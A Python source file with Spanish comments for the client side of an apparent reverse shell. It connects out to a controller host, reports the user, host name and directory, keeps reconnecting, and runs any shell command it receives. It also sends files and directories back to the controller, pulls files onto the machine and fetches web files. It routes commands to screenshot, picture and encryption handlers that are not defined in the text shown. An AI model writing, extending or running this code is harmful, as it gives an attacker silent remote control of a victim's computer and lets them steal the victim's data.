import socket
import os
import getpass
import re
import pickle
import struct
import requests
import platform
from time import sleep
from subprocess import Popen, PIPE
from zipfile import ZipFile

# Clase client-TCP
class TCP:
    # Se inicializa el host, el port y el chunk del programa
    def __init__(self, host, port):
        # host --> standar>localhost
        self.__host = host
        # port --> 1024-65535
        self.__port = port
        # chunk --> 4MB para enviar informacion
        self.__chunk = 4194304
        self.__myOs = platform.system().lower()

    def conectar(self):
        # Se inicia el ciclo para crear la conexion
        while True:
            try:
                # Se crea un socket
                self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Se configura el socket
                self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Se intenta conectar al servidor
                self.__sock.connect((self.__host, self.__port))

                sleep(0.05)
                # Se obtiene y se manda la informacion inicial
                userName = getpass.getuser()
                hostName = socket.gethostname()
                currentDir = os.getcwd()
                info = userName + '\n' + hostName + '\n' + currentDir
                self.__sock.send(info.encode())

                break

            except:
                # Si no se consigue una conexion, se espera 5 segundos
                sleep(5)

    # Funcion para regresar el nombre de un archivo o directorio
    # ubicacion --> ubicacion del archivo o directorio
    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    # Funcion para enviar datos
    # info --> informacion a enviar
    def enviarDatos(self, info):
        info = pickle.dumps(info)
        info = struct.pack('Q', len(info))+info
        self.__sock.sendall(info)

    # Funcion para recibir datos
    def recibirDatos(self):
        data = b''
        size = struct.calcsize('Q')
        while len(data) < size:
            info = self.__sock.recv(self.__chunk)
            data += info

        dataSize = data[:size]
        data = data[size:]
        byteSize = struct.unpack('Q', dataSize)[0]

        while len(data) < byteSize:
            data += self.__sock.recv(self.__chunk)

        info = data[:byteSize]
        data = data[byteSize:]
        info = pickle.loads(info)

        # Se regresa la informacion tratada para ser usada
        return info

    # Funcion para enviar un archivo
    # ubicacion --> ubicacion del archivo que se quiere enviar
    def enviarArchivo(self, ubicacion):
        peso = os.path.getsize(ubicacion)
        paquetes = int(peso/self.__chunk)
        self.__sock.send(f"{peso}-{paquetes}".encode())

        if peso > 0:
            ok = self.__sock.recv(8)
            with open(ubicacion, 'rb') as archivo:
                info = archivo.read(self.__chunk)
                while info:
                    self.enviarDatos(info)
                    info = archivo.read(self.__chunk)
                    msg = self.__sock.recv(8).decode()
                    if msg == "end":
                        break
            archivo.close()

    # Funcion para recibir un archivo
    # ubicacion --> ubicacion en donde se guardara el archivo recibido
    def recibirArchivo(self, ubicacion):
        peso = int(self.__sock.recv(1024).decode())

        if peso > 0:
            with open(ubicacion, 'wb') as archivo:
                self.__sock.send("ok".encode())
                while True:
                    info = self.recibirDatos()
                    archivo.write(info)

                    if len(info) < self.__chunk:
                        self.__sock.send("end".encode())
                        break
                    else:
                        self.__sock.send("ok".encode())
            archivo.close()

    # Funcion para enviar archivos de un directorio
    # origen --> ubicacion del directorio que se quiere enviar
    # index --> indice desde el que se quiere iniciar
    def enviarDirectorio(self, origen, index):
        self.__sock.send("ok".encode())
        # Se obtiene el numero de archivos
        archivos = []
        for i in os.listdir(origen):
            archivo = f"{origen}/{i}"
            if os.path.isfile(archivo):
                archivos.append(archivo)

        ok = self.__sock.recv(8)
        tam = len(archivos)
        self.__sock.send(str(tam).encode())

        # Se comienzan a enviar los archivos
        if index > tam:
            index = 1
        while index <= tam:
            nombre = self.getNombre(archivos[index-1])
            peso = os.path.getsize(archivos[index-1])
            paquetes = str(int(peso/self.__chunk))
            info = nombre + '\n' + paquetes + '\n' + str(peso)
            ok = self.__sock.recv(8)
            self.__sock.send(info.encode())

            res = self.__sock.recv(8).decode()
            if res == 'S':
                self.enviarArchivo(archivos[index-1])
                self.__sock.send("ok".encode())
            elif res == "quit":
                break
            else:
                pass

            index += 1

    # Funcion para recibir un directorio
    # destino --> directorio en el que se guardaran los archivos
    # index --> indice de referencia
    def recibirDirectorio(self, destino, index):
        # Si no existe el directorio destino, se crea
        if not os.path.isdir(destino):
            os.mkdir(destino)

        # Se recibe el numero de archivos
        ok = self.__sock.recv(8)
        self.__sock.send("ok".encode())
        tam = int(self.__sock.recv(64).decode())
        self.__sock.send("ok".encode())

        # Se comienzan a recibir los archivos
        if index > tam:
            index = 1
        while index <= tam:
            res = self.__sock.recv(8).decode()

            if res == 'S':
                self.__sock.send("ok".encode())
                nombre = self.__sock.recv(1024).decode()

                self.__sock.send("ok".encode())
                self.recibirArchivo(f"{destino}/{nombre}")
                ok = self.__sock.recv(8)

            elif res == "quit":
                break
            else:
                pass

            index += 1

    # Funcion para cambiar de directorio
    # directorio --> directorio al que se quiere cambiar
    def cd(self, directorio):
        if os.path.isdir(directorio):
            os.chdir(directorio)
            self.__sock.send(os.getcwd().encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar un archivo al servidor
    # cmd --> comando recibido
    def sendFileFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())
                ok = self.__sock.recv(8)
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__sock.send("ok".encode())

                ok = self.__sock.recv(8)
                nombre = self.getNombre(origen)
                self.__sock.send(nombre.encode())

                ok = self.__sock.recv(8)
                self.enviarArchivo(origen)

            else:
                self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para recibir un archivo del servidor
    # cmd --> comando recibido
    def sendFileTo(self, cmd):
        if re.search("-d[= ]", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            self.__sock.send("ok".encode())
            self.recibirArchivo(destino)

        else:
            self.__sock.send("ok".encode())
            destino = self.__sock.recv(1024).decode()

            self.__sock.send("ok".encode())
            self.recibirArchivo(destino)

    # Funcion para enviar un directorio al servidor
    # cmd --> comando recibido
    def sendDirFrom(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                ok = self.__sock.recv(8)
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

        else:
            if re.search("-i[= ]", cmd):
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            if os.path.isdir(origen):
                self.__sock.send("ok".encode())
                ok = self.__sock.recv(8)
                self.__sock.send(self.getNombre(origen).encode())

                ok = self.__sock.recv(8)
                self.enviarDirectorio(origen, index)

            else:
                self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())

    # Funcion para recibir un directorio del servidor
    # cmd --> comando recibido
    def sendDirTo(self, cmd):
        if re.search("-d[= ]", cmd):
            if re.search("-i[= ]", cmd):
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                index = 1

            self.__sock.send("ok".encode())
            self.recibirDirectorio(destino, index)

        else:
            if re.search("-i[= ]", cmd):
                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
                if index <= 0:
                    index = 1
            else:
                index = 1

            self.__sock.send("ok".encode())
            destino = self.__sock.recv(1024).decode()

            self.__sock.send("ok".encode())
            self.recibirDirectorio(destino, index)

    # Funcion para comprimir un directorio
    # cmd --> comando recibido
    def comprimir(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

        if os.path.isfile(origen):
            if not re.search("-d[= ]", cmd):
                destino = f"{self.getNombre(origen)}.zip"

            nombre = self.getNombre(origen)
            with ZipFile(destino, 'w') as zip:
                zip.write(origen, nombre)
            zip.close()
            info = f"Archivo \"{nombre}\" comprimido"

        elif re.search('/', origen) and not os.path.isdir(origen):
            if re.search("-d[= ]", cmd):
                archivos = origen.split('/')
                directorio = os.getcwd()
                info = '\n'
                with ZipFile(destino, 'w') as zip:
                    for i in archivos:
                        archivo = f"{directorio}/{i}"
                        if os.path.isfile(archivo):
                            nombre = self.getNombre(archivo)
                            zip.write(archivo, nombre)
                            info += f"Archivo \"{i}\" comprimido\n"
                zip.close()
            else:
                info = "error: Falta del parametro de destino (-d)"

        elif os.path.isdir(origen):
            destino = f"{self.getNombre(origen)}.zip"

            archivos = []
            for i in os.listdir(origen):
                archivo = f"{origen}/{i}"
                if os.path.isfile(archivo):
                    archivos.append(archivo)

            comprimidos = 0
            cont = len(os.listdir(origen))
            with ZipFile(destino, 'w') as zip:
                for i in archivos:
                    nombre = self.getNombre(i)
                    zip.write(i, nombre)
                    comprimidos += 1
            zip.close()
            info = f"{comprimidos} elementos comprimidos de {cont}"

        else:
            info = f"error: Error al comprimir el archivo o directorio \"{origen}\""

        self.__sock.send(info.encode())

    # Funcion para descomprimir un archivo '.zip'
    # cmd --> comando recibido
    def descomprimir(self, cmd):
        if re.search("-d[= ]", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            destino = self.getNombre(origen).replace(".zip", '')

        if os.path.isfile(origen) and origen.endswith(".zip"):
            if not os.path.isdir(destino):
                os.mkdir(destino)

            descomprimidos = 0
            with ZipFile(origen, 'r') as zip:
                for i in zip.namelist():
                    zip.extract(i, destino)
                    descomprimidos += 1
            zip.close()

            self.__sock.send(f"{descomprimidos} elementos descomprimidos".encode())
        else:
            self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())

    # Funcion para descargar archivos web
    # cmd --> comando recibido
    def wget(self, cmd):
        extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
            "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
        extensionesUpper = [i.upper() for i in extensiones]

        if re.search("-n[= ]", cmd):
            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
            nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            valido = True
        else:
            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            valido = False
            i = 0
            while i < len(extensiones):
                if re.search(f"[.]{extensiones[i]}", url):
                    valido = True
                    ext = extensiones[i]
                    break
                if re.search(f"[.]{extensionesUpper[i]}", url):
                    valido = True
                    ext = extensionesUpper[i]
                    break
                i += 1

            if valido:
                nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
                nombre = nombre.split('/')[-1]

        if valido:
            self.__sock.send("ok".encode())
            try:
                req = requests.get(url)

                with open(nombre, 'wb') as archivo:
                    archivo.write(req.content)
                archivo.close()

                self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())

            except:
                self.__sock.send(f"error: Error al descargar el archivo".encode())
        else:
            self.__sock.send("error: URL no valida".encode())

    # Funcion para enviar al servidor la cantidad de elementos de un directorio
    # cmd --> comando recibido
    def lenDir(self, cmd):
        directorio = cmd[7:]
        if os.path.isdir(directorio):
            self.__sock.send("ok".encode())
            archivos = 0
            directorios = 0
            total = 0

            ok = self.__sock.recv(8)
            for i in os.listdir(directorio):
                elemento = f"{directorio}/{i}"
                if os.path.isfile(elemento):
                    archivos += 1
                if os.path.isdir(elemento):
                    directorios += 1
                total += 1

            info = f"\nElementos: {total}\nDirectorios: {directorios}\nArchivos: {archivos}"
            self.__sock.send(info.encode())

        else:
            self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())

    # Funcion para enviar a un archivo del servidor la salida de un comando
    # cmd --> comando recibido
    def save(self, cmd):
        self.__sock.send("ok".encode())
        ok = self.__sock.recv(8)
        if cmd[:4] == "open":
            self.enviarDatos("No se puede almacenar informacion".encode())
        else:
            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            info = comando.stdout.read() + comando.stderr.read()
            if self.__myOs == "linux" or self.__myOs == "darwin":
                info = info.decode("utf-8")
            if self.__myOs == "windows":
                info = info.decode("cp850")

            if info == '':
                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
            else:
                i = 0
                while i < len(info):
                    self.enviarDatos(info[i:i+self.__chunk].encode())
                    i += self.__chunk

    # Funcion para recibir y evaluar comandos
    def shell(self):
        try:
            while True:
                # Se recibe el comando
                cmd = self.__sock.recv(1024).decode()

                # Si el comando es 'exit'...
                if cmd.lower() == "exit":
                    try:
                        # Se termina la conexion
                        self.__sock.close()
                        break

                    except:
                        continue

                # Si el comando es 'q' o 'quit'...
                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        # Se cierra el socket
                        self.__sock.close()
                        # Y se manda a llamar a la funcion
                        # 'self.conectar'
                        self.conectar()

                    except:
                        continue

                # Si el comando es 'cd'...
                elif cmd.lower()[:2] == "cd":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.cd'
                        self.cd(cmd[3:])

                    except:
                        continue

                # Si el comando es 'sff'...
                elif cmd.lower()[:3] == "sff":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileFrom'
                        self.sendFileFrom(cmd)

                    except:
                        continue

                # Si el comando es 'sft'...
                elif cmd.lower()[:3] == "sft":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendFileTo'
                        self.sendFileTo(cmd)

                    except:
                        continue

                # Si el comando es 'img'...
                elif cmd.lower()[:3] == "img":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.image'
                        self.image(cmd)

                    except:
                        continue

                # Si el comando es 'pic'...
                elif cmd.lower()[:3] == "pic":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.pic'
                        self.pic(cmd)

                    except:
                        continue

                # Si el comando es 'cap'...
                elif cmd.lower()[:3] == "cap":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.captura'
                        self.captura(cmd)

                    except:
                        continue

                # Si el comando es 'sdf'...
                elif cmd.lower()[:3] == "sdf":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirFrom'
                        self.sendDirFrom(cmd)

                    except:
                        continue

                # Si el comando es 'sdt'...
                elif cmd.lower()[:3] == "sdt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.sendDirTo'
                        self.sendDirTo(cmd)

                    except:
                        continue

                # Si el comando es 'zip'...
                elif cmd.lower()[:3] == "zip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.comprimir'
                        self.comprimir(cmd)

                    except:
                        continue

                # Si el comando es 'unzip'...
                elif cmd.lower()[:5] == "unzip":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.descomprimir'
                        self.descomprimir(cmd)

                    except:
                        continue

                # Si el comando es 'encrypt'...
                elif cmd.lower()[:7] == "encrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.encrypt'
                        self.encrypt(cmd)

                    except:
                        continue

                # Si el comando es 'decrypt'...
                elif cmd.lower()[:7] == "decrypt":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.decrypt'
                        self.decrypt(cmd)

                    except:
                        continue

                # Si el comando es 'miwget'...
                elif cmd.lower()[:6] == "miwget":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.wget'
                        self.wget(cmd)

                    except:
                        continue

                # Si el comando es 'lendir'...
                elif cmd.lower()[:6] == "lendir":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.lenDir'
                        self.lenDir(cmd)

                    except:
                        continue

                # Si el comando es 'save'...
                elif cmd.lower()[:4] == "save":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.save'
                        cmd = cmd[5:]
                        self.save(cmd)

                    except:
                        continue

                # Si no hay una coincidencia, se ejecuta el comando
                # y se envia lo que este regresa
                else:
                    try:
                        if cmd.lower()[:4] == "open":
                            if self.__myOs == "linux" or self.__myOs == "darwin":
                                os.system(cmd[:4].lower() + cmd[5:])
                            if self.__myOs == "windows":
                                os.system(cmd[5:])
                            self.__sock.send("[+] Comando ejecutado".encode())

                        else:
                            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                            info = comando.stdout.read() + comando.stderr.read()
                            if self.__myOs.lower() == "linux" or self.__myOs.lower() == "darwin":
                                info = info.decode("utf-8")
                            if self.__myOs == "windows":
                                info = info.decode("cp850")

                            if info == '':
                                self.enviarDatos("[+] Comando ejecutado --> Salida vacia".encode())

                            else:
                                i = 0
                                while i < len(info):
                                    self.enviarDatos(info[i:i+self.__chunk].encode())
                                    i += self.__chunk

                    except:
                        continue

        except:
            self.conectar()
